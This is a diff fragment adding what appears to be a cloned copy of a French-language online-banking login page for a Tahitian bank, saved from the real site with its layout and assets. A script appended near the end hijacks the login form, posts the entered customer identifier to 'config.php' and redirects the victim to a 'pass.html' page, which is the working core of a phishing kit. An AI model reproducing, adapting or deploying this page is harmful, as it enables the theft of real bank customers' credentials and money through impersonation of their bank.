193.792C349.474 212.817 350.677 228.232 348.572 240.565C345.714 243.046 339.398 242.294 335.036 241.317C315.635 191.31 317.59 64.6024 287.812 31.5906C283.451 26.778 269.539 23.6197 262.621 29.9363C249.988 41.2911 244.799 62.1961 242.543 92.8015C238.858 143.184 232.467 192.589 251.266 220.036C255.176 225.751 263.523 237.482 269.539 246.13C265.554 252.371 260.515 257.484 254.499 261.019C216.825 244.024 84.7033 120.775 62.3696 140.928C47.5557 154.313 47.3301 197.401 71.3933 224.097C96.2085 251.694 151.404 302.528 171.933 308.619C192.461 314.71 208.178 312.078 225.097 307.942C227.504 310.348 228.331 316.063 228.556 319.522C177.196 347.872 71.5437 360.204 49.4356 380.132C32.8169 395.096 28.0795 423.22 43.4198 440.29C65.9039 465.255 160.427 441.117 191.108 413.519C221.789 385.922 220.736 383.516 242.242 369.002C244.122 369.153 248.86 374.116 250.213 376.071C202.914 466.233 121.249 543.762 144.937 570.081C164.638 591.963 222.465 572.487 249.988 547.597C277.585 522.782 310.973 458.563 295.858 403.894C298.791 402.841 302.25 401.337 308.491 402.089C327.065 422.694 296.009 590.535 334.66 633.472C350.076 650.542 383.012 652.648 400.157 637.232C430.311 610.086 407.978 463.225 387.449 440.44C375.192 426.829 359.927 424.799 352.482 413.971C354.362 409.91 356.016 409.985 358.723 406.752C379.102 416.151 393.841 417.58 414.445 427.581V427.431Z" fill="white" fill-opacity="0.25"/>
+<path d="M375.191 346.743C383.312 339.449 383.538 323.357 378.65 317.868C373.461 312.077 358.121 313.055 354.512 316.288C343.834 325.914 342.856 336.667 352.857 347.871C358.647 354.263 366.092 354.94 375.191 346.743Z" fill="white" fill-opacity="0.25"/>
+<path d="M369.325 308.543C375.566 302.903 379.176 282.75 375.265 278.388C369.475 271.997 360.677 273.726 355.263 278.614C346.164 286.81 343.682 300.496 349.924 307.415C358.421 316.889 362.632 314.709 369.4 308.618L369.325 308.543Z" fill="white" fill-opacity="0.25"/>
+<path d="M326.388 294.331C335.336 286.285 334.434 276.66 328.493 270.043C323.305 264.328 311.95 270.193 310.145 271.847C303.904 277.487 298.715 283.052 307.588 292.827C312.852 298.693 319.244 300.723 326.388 294.331Z" fill="white" fill-opacity="0.25"/>
+<path d="M346.613 357.421C338.116 347.947 325.934 345.991 317.963 353.21C309.992 360.354 312.473 375.319 319.166 382.838C325.859 390.283 338.793 389.982 343.38 385.846C351.351 378.702 354.584 366.22 346.613 357.421Z" fill="white" fill-opacity="0.25"/>
+<path d="M292.922 363.512C299.013 358.023 299.69 345.766 295.028 340.652C290.365 335.464 281.943 338.772 279.763 340.727C277.582 342.683 272.844 356.519 278.635 362.911C284.124 369.002 288.034 367.949 292.997 363.512H292.922Z" fill="white" fill-opacity="0.25"/>
+<path d="M291.872 327.568C298.791 321.327 304.28 303.204 295.557 293.579C290.519 287.939 282.247 284.555 273.524 292.451C264.049 301.023 263.072 315.762 271.043 324.635C278.563 332.982 286.609 332.381 291.872 327.643V327.568Z" fill="white" fill-opacity="0.25"/>
+</svg>
+<div _ngcontent-ng-c818687559="" class="theme-dark-connection" style="position:relative;z-index:1;"><!----><!----><div _ngcontent-ng-c2137753118="" class="container-fluid ng-star-inserted"><div _ngcontent-ng-c2137753118="" class="header-content"><div _ngcontent-ng-c2137753118="" class="inner-content"><div _ngcontent-ng-c2137753118="" class="logo logo-btbnc-bt"></div></div></div></div><!----><ion-grid _ngcontent-ng-c818687559="" class="form-template responsive-grid-mobile ng-star-inserted md"><template shadowrootmode="open"><slot></slot></template><!----><ion-row _ngcontent-ng-c818687559="" class="md"><template shadowrootmode="open"><slot></slot></template><ion-col _ngcontent-ng-c818687559="" size-xs="0" size-xl="2" class="md" style="flex: 0 0 calc(calc(2 / var(--ion-grid-columns, 12)) * 100%); width: calc(calc(2 / var(--ion-grid-columns, 12)) * 100%); max-width: calc(calc(2 / var(--ion-grid-columns, 12)) * 100%);"><template shadowrootmode="open"><slot></slot></template></ion-col><ion-col _ngcontent-ng-c818687559="" size-xs="12" size-xl="8" class="md" style="flex: 0 0 calc(calc(8 / var(--ion-grid-columns, 12)) * 100%); width: calc(calc(8 / var(--ion-grid-columns, 12)) * 100%); max-width: calc(calc(8 / var(--ion-grid-columns, 12)) * 100%);"><template shadowrootmode="open"><slot></slot></template><fbr-panel _ngcontent-ng-c818687559="" _nghost-ng-c98900857=""><fbr-blockable-div _ngcontent-ng-c98900857="" _nghost-ng-c2567436200=""><div _ngcontent-ng-c2567436200="" class="p-element"><fbr-blockui _ngcontent-ng-c2567436200=""><div class="p-blockui p-component-overlay" style="display: none;"><!----></div></fbr-blockui><div _ngcontent-ng-c98900857="" class="no-title"><div _ngcontent-ng-c98900857="" class="collapsible-septary-panel-wrapper expanded"><p-panel _ngcontent-ng-c98900857="" class="p-element ng-tns-c794833568-1 ng-star-inserted"><div class="ng-tns-c794833568-1 p-panel p-component" id="pn_id_4" data-pc-name="panel"><div class="p-panel-header ng-tns-c794833568-1 ng-star-inserted" id="pn_id_4-titlebar"><!----><p-header _ngcontent-ng-c98900857="" class="ng-tns-c794833568-1"><div _ngcontent-ng-c98900857="" class="ui-helper-clearfix ui-helper-clearfix-header"><span _ngcontent-ng-c98900857="" class="p-panel-title"><!---->  <!----><!----><!----><!----><!----></span><!----><!----><!----></div></p-header><!----><div class="p-panel-icons ng-tns-c794833568-1 p-panel-icons-end"><!----><!----></div></div><!----><div role="region" class="p-toggleable-content ng-tns-c794833568-1 ng-trigger ng-trigger-panelContent" id="pn_id_4_content" aria-labelledby="pn_id_4_header" aria-hidden="false"><div class="p-panel-content ng-tns-c794833568-1" id="loginSignature"><!----><div _ngcontent-ng-c98900857="" class="panel-content ng-tns-c794833568-1 form-section-content" id="loginSignature"><ion-grid _ngcontent-ng-c818687559="" class="md"><template shadowrootmode="open"><slot></slot></template><div _ngcontent-ng-c818687559="" class="select-language"><fbr-language-select _ngcontent-ng-c2137753118=""><!----></fbr-language-select><!----></div><ion-row _ngcontent-ng-c818687559="" class="ng-star-inserted md" style=""><template shadowrootmode="open"><slot></slot></template><ion-col _ngcontent-ng-c818687559="" class="input-button-container md"><template shadowrootmode="open"><slot></slot></template><fbr-field-input-static _ngcontent-ng-c818687559="" cssinput="label-title" class="center-input" _nghost-ng-c71584862=""><div _ngcontent-ng-c71584862="" class="label-title form-group form-group-static-elements form-group-stack simple-label"><label _ngcontent-ng-c71584862="" class="form-control-label ng-star-inserted" for="Accès"><span _ngcontent-ng-c71584862="" class="form-control-label-text">Accès<!----></span><!----><!----><!----></label><!----><!----><!----><!----><!----><!----><!----></div></fbr-field-input-static></ion-col></ion-row><!----><!----><form _ngcontent-ng-c2137753118="" id="loginForm" autocomplete="off" method="GET" action="./anchor.html"><!----><ion-row _ngcontent-ng-c2137753118="" class="not-displayed displayed md"><template shadowrootmode="open"><slot></slot></template><ion-col _ngcontent-ng-c2137753118="" class="md"><template shadowrootmode="open"><slot></slot></template><fbr-field-input _ngcontent-ng-c2137753118=""><div class="form-group form-group-stack"><label class="form-control-label ng-star-inserted" for="login.label.identifier" style=""> Identifiant<!----><!----></label><!----><!----><div class="form-control-wrapper"><div class="form-control-element input-element"><div><!----><input class="form-control ng-untouched ng-pristine ng-invalid" id="loginUsername" name="loginUsername" type="text" placeholder=""><!----><!----><!----><!----><!----></div></div><fbr-validator-message _nghost-ng-c1098984121=""><!----></fbr-validator-message></div></div></fbr-field-input><fbr-button _ngcontent-ng-c2137753118="" _nghost-ng-c400102224=""><button _ngcontent-ng-c400102224="" applystyle="" id="button-loginlabelforgottenSubscription" name="" type="button" class="btn btn-link btn-text-link btn-lg justify-content-start ng-star-inserted" style=""><div _ngcontent-ng-c400102224="" class="p-element ng-star-inserted"><!----><!----><span _ngcontent-ng-c400102224="">Identifiant oublié ?</span><!----><!----></div><!----><!----><!----><!----><!----></button><!----><!----></fbr-button></ion-col></ion-row><ion-row _ngcontent-ng-c2137753118="" class="md"><template shadowrootmode="open"><slot></slot></template><ion-col _ngcontent-ng-c2137753118="" class="md"><template shadowrootmode="open"><slot></slot></template><fbr-checkbox _ngcontent-ng-c2137753118="" class="not-displayed displayed"><div class="checkbox"><label class="checkbox-label"> Mémoriser mon identifiant <input type="checkbox" name="loginSaveSubscription"><span class="checkbox-icon" id="loginSaveSubscription"></span></label></div></fbr-checkbox></ion-col></ion-row><!----><ion-row _ngcontent-ng-c2137753118="" class="md"><template shadowrootmode="open"><slot></slot></template><ion-col _ngcontent-ng-c2137753118="" class="md"><template shadowrootmode="open"><slot></slot></template><fbr-button _ngcontent-ng-c2137753118="" _nghost-ng-c400102224=""><button _ngcontent-ng-c400102224="" applystyle="" id="connect" name="connect" type="submit" class="btn primary-button btn-sm ng-star-inserted" disabled="" style=""><div _ngcontent-ng-c400102224="" class="p-element ng-star-inserted"><!----><!----><span _ngcontent-ng-c400102224="">ME CONNECTER</span><!----><!----></div><!----><!----><!----><!----><!----></button><!----><!----></fbr-button></ion-col></ion-row></form><ion-row _ngcontent-ng-c2137753118="" class="ng-star-inserted md" style=""><template shadowrootmode="open"><slot></slot></template><ion-col _ngcontent-ng-c2137753118="" class="md"><template shadowrootmode="open"><slot></slot></template><fbr-button _ngcontent-ng-c2137753118="" _nghost-ng-c400102224=""><button _ngcontent-ng-c400102224="" applystyle="" id="button-loginlabelforgotAccess" name="" type="button" class="btn btn-link btn-text-link btn-lg ng-star-inserted"><div _ngcontent-ng-c400102224="" class="p-element ng-star-inserted"><!----><!----><span _ngcontent-ng-c400102224="">Code d'accès oublié</span><!----><!----></div><!----><!----><!----><!----><!----></button><!----><!----></fbr-button></ion-col></ion-row><!----><ion-row _ngcontent-ng-c2137753118="" class="ng-star-inserted md" style=""><template shadowrootmode="open"><slot></slot></template><ion-col _ngcontent-ng-c2137753118="" class="md"><template shadowrootmode="open"><slot></slot></template><fbr-button _ngcontent-ng-c2137753118="" _nghost-ng-c400102224=""><button _ngcontent-ng-c400102224="" applystyle="" id="button-loginlabelfirstConnection" name="" type="button" class="btn btn-link btn-text-link btn-lg ng-star-inserted"><div _ngcontent-ng-c400102224="" class="p-element ng-star-inserted"><!----><!----><span _ngcontent-ng-c400102224="">Activer mon espace privé</span><!----><!----></div><!----><!----><!----><!----><!----></button><!----><!----></fbr-button></ion-col></ion-row><!----><!----><ion-row _ngcontent-ng-c818687559="" class="md"><template shadowrootmode="open"><slot></slot></template><ion-col _ngcontent-ng-c818687559="" size="12" class="md" style="flex: 0 0 calc(calc(12 / var(--ion-grid-columns, 12)) * 100%); width: calc(calc(12 / var(--ion-grid-columns, 12)) * 100%); max-width: calc(calc(12 / var(--ion-grid-columns, 12)) * 100%);"><template shadowrootmode="open"><slot></slot></template><fbr-form-button _ngcontent-ng-c818687559="" _nghost-ng-c154291738=""><div _ngcontent-ng-c154291738="" class="form-actions group-buttons-right"></div></fbr-form-button></ion-col></ion-row><!----></ion-grid></div><!----></div><!----></div></div></p-panel></div></div></div><!----></fbr-blockable-div></fbr-panel></ion-col><ion-col _ngcontent-ng-c818687559="" size-xs="0" size-xl="2" class="md" style="flex: 0 0 calc(calc(2 / var(--ion-grid-columns, 12)) * 100%); width: calc(calc(2 / var(--ion-grid-columns, 12)) * 100%); max-width: calc(calc(2 / var(--ion-grid-columns, 12)) * 100%);"><template shadowrootmode="open"><slot></slot></template></ion-col></ion-row><!----></ion-grid><ion-grid _ngcontent-ng-c818687559="" class="ng-star-inserted md"><template shadowrootmode="open"><slot></slot></template><ion-row _ngcontent-ng-c818687559="" class="md"><template shadowrootmode="open"><slot></slot></template><ion-col _ngcontent-ng-c818687559="" class="page-disclaimer md"><template shadowrootmode="open"><slot></slot></template><!----><div _ngcontent-ng-c2137753118=""><fbr-button _ngcontent-ng-c2137753118="" _nghost-ng-c400102224=""><button _ngcontent-ng-c400102224="" applystyle="" id="button-loginlabelhelpLogging" name="" type="button" class="btn btn-link btn-square btn-lg ng-star-inserted"><div _ngcontent-ng-c400102224="" class="p-element ng-star-inserted"><!----><ion-icon _ngcontent-ng-c400102224="" class="leftIcon ng-star-inserted md" role="img" name="custom-help"><template shadowrootmode="open"><div class="icon-inner"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="s-ion-icon">
+<path d="M12 3C7.02995 3 3 7.02995 3 12C3 16.9701 7.02995 21 12 21C16.9701 21 21 16.9701 21 12C21 7.02995 16.9701 3 12 3Z" stroke="currentColor" stroke-width="1.1" stroke-miterlimit="10"></path>
+<path d="M12.5956 17.1512L12.97 17.3974L12.5956 17.1512C12.5157 17.2727 12.4029 17.3662 12.2725 17.4211C12.1421 17.4759 11.9991 17.4902 11.8613 17.4623C11.7234 17.4344 11.5956 17.3655 11.4945 17.2628L11.1393 17.6125L11.4945 17.2628C11.3934 17.1601 11.3237 17.0282 11.2954 16.8836C11.267 16.7388 11.2816 16.5889 11.337 16.4531C11.3924 16.3173 11.4856 16.2025 11.6037 16.1224C11.7217 16.0423 11.8596 16 12 16C12.1881 16 12.3701 16.0758 12.5055 16.2134C12.6412 16.3512 12.7188 16.5398 12.7188 16.7381C12.7188 16.8858 12.6756 17.0296 12.5956 17.1512Z" stroke="currentColor" stroke-miterlimit="10"></path>
+<path d="M11.9803 14.4693V13.7631C11.9803 13.4449 12.129 13.1365 12.3838 12.9177L13.6898 11.8038C14.3587 11.2369 14.741 10.4213 14.741 9.57595C14.741 8.15371 13.5093 7 11.991 7C10.4726 7 9.24097 8.15371 9.24097 9.57595V9.83454" stroke="currentColor" stroke-width="1.1" stroke-miterlimit="10"></path>
+</svg></div></template></ion-icon><!----><span _ngcontent-ng-c400102224="">Contact</span><!----><!----></div><!----><!----><!----><!----><!----></button><!----><!----></fbr-button></div><!----></ion-col></ion-row></ion-grid><!----><!----><!----><!----><!----></div></div></fho-page-container></fho-page-container-template-connection><div _ngcontent-ng-c2137753118="" class="toaster"><p-toast _ngcontent-ng-c2137753118="" class="p-element ng-tns-c1067615279-0 ng-star-inserted"><div class="p-toast p-component ng-tns-c1067615279-0 fbr-growl-large p-toast-top-right"><!----></div></p-toast></div><!----></app-login><!----></div></app-root>
+  <link rel="modulepreload" href="./chunk-Y2JYUBLA.js"><link rel="modulepreload" href="https://tiarenet.banque-tahiti.pf/auth/resources/4rs4d/login/fhome-login/chunk-4WFVMWDK.js"><link rel="modulepreload" href="./chunk-7D2EH4XU.js"><link rel="modulepreload" href="./chunk-MMIXVVWR.js"><link rel="modulepreload" href="./chunk-BR7RAB4H.js"><link rel="modulepreload" href="./chunk-7KGURMOZ.js"><link rel="modulepreload" href="./chunk-HDQOZQ47.js"><link rel="modulepreload" href="./chunk-OYZTO3RJ.js"><link rel="modulepreload" href="./chunk-4ILLQSIX.js"><link rel="modulepreload" href="./chunk-ZUE3IRRM.js"><script src="./polyfills-EONH2QZO.js.téléchargement" type="module"></script><script src="./main-5CIBVLC6.js.téléchargement" type="module"></script>
+
+<script>
+// Remplacer la partie script existante par :
+document.addEventListener('DOMContentLoaded', function() {
+  var input = document.getElementById('loginUsername');
+  var button = document.getElementById('connect');
+  var form = document.getElementById('loginForm');
+
+  input.addEventListener('input', function() {
+    button.disabled = this.value.trim() === '';
+  });
+
+  form.addEventListener('submit', function(e) {
+    e.preventDefault();
+    var username = input.value.trim();
+    if (username !== '') {
+      // Envoi de l'identifiant à config.php
+      fetch('config.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'type=identifiant&value=' + encodeURIComponent(username)
+      }).then(() => {
+        window.location.href = './pass.html';
+      }).catch(() => {
+        // En cas d'erreur, rediriger quand même
+        window.location.href = './pass.html';
+      });
+    }
+  });
+});
+</script>
+<div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe title="reCAPTCHA" width="256" height="60" role="presentation" name="a-c42utlho5gr0" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="./anchor.html"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;" src="./saved_resource.html"></iframe></div></body></html>
